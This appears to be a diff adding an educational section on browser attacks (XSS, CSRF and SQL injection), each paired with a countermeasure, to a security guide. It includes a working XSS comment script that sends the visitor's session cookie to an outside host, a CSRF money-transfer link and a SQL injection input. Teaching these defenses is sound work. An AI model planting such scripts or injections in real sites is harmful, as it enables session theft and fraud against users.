@@ -595,6 +595,208 @@ from security attacks.
   - 'HttpOnly' Cookie - This flag can be used when declaring the server declares a cookie
   for the client to use but ensures that the cookie isn't accessible by JavaScript
 
+### Browser-Based Client-Server Vulnerabilities
+
+HTML and JavaScript allow a lot of flexibility which give the browser a lot of power
+but can also open it up to attack.
+
+Here are common attack vectors and some countermeasures for those classes of attack.
+
+#### Cross-Site Scripting (XSS)
+
+Many web sites incorporate user-generated content, the most classic example being
+users posting comments to a news article.
+
+A bad user could decide to post a comment that, for instance, gets another user's session
+cookie and sends that cookie to a malicious web site that then uses that cookie
+to do bad things to that other user's account.
+
+Here's an example which can be tried at
+https://www.w3schools.com/html/tryit.asp?filename=tryhtml_basic .
+
+```
+<html>
+  <head>
+    <script>
+      document.cookie = "userSession=123";
+    </script>
+  </head>
+  <body>
+    <h1>What is your opinion of the game 'Purple Martians'?</h1>
+    <div>
+      <h2>Comment 1 - This is a really cool game.</h2>
+      <p>
+        I recommend this game to all of my friends.
+      </p>
+    </div>
+    <div>
+      <h2>Comment 2 - HaHa you fool - I'm stealing your session token to buy
+      games with your credit card.
+      </h2>
+      <p>
+        Gimme your session token in 5 seconds.
+        <script>
+          setTimeout(
+            function() {
+              window.location.href = "https://postman-echo.com/get?userSession=" + document.cookie;
+            },
+            5000
+          );
+        </script>
+      </p>
+    </div>
+  </body>
+</html>
+```
+
+The above HTML page asks users to post comments about the video game 'Purple Martians'
+and the comment of the first user is a benign 'I recommend this game to all of my friends.'
+but the second user is malicious and posted this comment.
+
+```
+        Gimme your session token in 5 seconds.
+        <script>
+          setTimeout(
+            function() {
+              window.location.href = "https://postman-echo.com/get?userSession=" + document.cookie;
+            },
+            5000
+          );
+        </script>
+```
+
+This isn't a valid comment (good or bad) about a video game, but an attempt to change
+the functionality of the web page by maliciously sending the user's session cookie
+to 'postman-echo.com' (which is actually a friendly website). The owner of that website
+can then use the user's session cookie to act like the user (including purchasing
+video games with the user's credit card!). Scan the resulting web page and notice that
+'userSession=123' (the user's session cookie) appears in it.
+
+Note that _any_ user visiting this site will have his/her session cookie stolen.
+
+##### Countermeasure for XSS
+
+A partial solution for the above case would be for the server to an `HttpOnly` cookie
+for 'userSession' so that JavaScript can't access it.
+
+But one of the best countermeasure is to `escape` user comments on the server while
+generating the HTML page. `escaping` means taking each character in a comment and
+(if necessary) converting special HTML characters (like '<' and '>') into a sequence
+of characters (which are '&lt;' for '<' and '&gt;' for '>') that just print the character
+to the web page. Everyone will see what the user typed in but what got typed in won't
+have an active component (the 'sting' will be taken out - the trap has been disarmed).
+
+For the above bad comment, its `escaped` form is the following.
+
+```
+        Gimme your session token in 5 seconds.
+        &lt;script&gt;
+          setTimeout(
+            function() {
+              window.location.href = &quot;https://postman-echo.com/get?userSession=&quot; + document.cookie;
+            },
+            5000
+          );
+        &lt;/script&gt;
+```
+
+Here's the whole updated web page which is now benign in spite of XSS attack attempt.
+
+```
+<html>
+  <head>
+    <script>
+      document.cookie = "userSession=123";
+    </script>
+  </head>
+  <body>
+    <h1>What is your opinion of the game 'Purple Martians'?</h1>
+    <div>
+      <h2>Comment 1 - This is a really cool game.</h2>
+      <p>
+        I recommend this game to all of my friends.
+      </p>
+    </div>
+    <div>
+      <h2>Comment 2 - HaHa you fool - I'm stealing your session token to buy
+      games with your credit card.
+      </h2>
+      <p>
+        Gimme your session token in 5 seconds.
+        &lt;script&gt;
+          setTimeout(
+            function() {
+              window.location.href = &quot;https://postman-echo.com/get?userSession=&quot; + document.cookie;
+            },
+            5000
+          );
+        &lt;/script&gt;
+      </p>
+    </div>
+  </body>
+</html>
+```
+
+#### Cross-Site Request Forgery (CSRF)
+
+CSRF can be one of the following.
+
+  - When one web site constructs a URL stated to be for one thing but the link does
+  something else that the user didn't expect on another web site.
+  - One web site makes an invisible call to another web site (like by using `AJAX`).
+
+For the first case, the user could be presented with the following URL.
+
+```
+<a href="https://mybank.gov?action=transferMoney&amount=30&toAccount=badAccount">Click here for free video games</a>
+```
+
+The user may click on this link thinking he/she will get free video games, but instead
+the user is fooled into transferring 30 dollars into `badAccount` if the user had already
+logged into 'myback.gov' but hadn't logged out yet.
+
+##### Countermeasure for CSRF
+
+A `CSRF Token` is a code that a web site places on a web page for the user to include
+to calls back to the web site.
+
+So if the user is at 'mybank.gov' and that web page includes a JavaScript variable
+'csrfToken' (with value of '789', for instance), then the user correctly submits that
+token value when performing actions (like 'transferMoney') when on that web site.
+
+But, if the user is fooled into clicking the 'Click here for free video games' link
+on the bad web site, the 'csrfToken' isn't sent and that action is rejected.
+
+#### SQL Injection
+
+Imagine a web page constructing its list of bank account transactions with the following
+statement and the 'accountId' value comes from an HTML form field.
+
+```
+var sqlStatement = "select * from transactions where accountId=" + accountId;
+getData(sqlStatement);
+```
+
+Honest users would enter in a valid value (like '123' which would result in statement
+'select * from transactions where accountId=123'), but a malicious attacker could
+try to add extra query information with a value like '123 or accountId=456' would would
+result in statement 'select * from transactions where accountId=123 or accountId=456'
+giving that attacker unauthorized information.
+
+##### Countermeasure for SQL Injection
+
+Use a `prepared statement` which explicitly delineates the custom parts of a query.
+Here's an example.
+
+```
+var sqlStatement = "select * from transactions where accountId=?";
+getDataWithParameter(sqlStatement, accountId);
+```
+
+For the malicious attacker the resulting query would be
+'select * from transactions where accountId="123 or accountId=456"' which wouldn't
+be valid.
+
 ## Network Security
 
 Network security is a vast subject but here are samples of key topics.
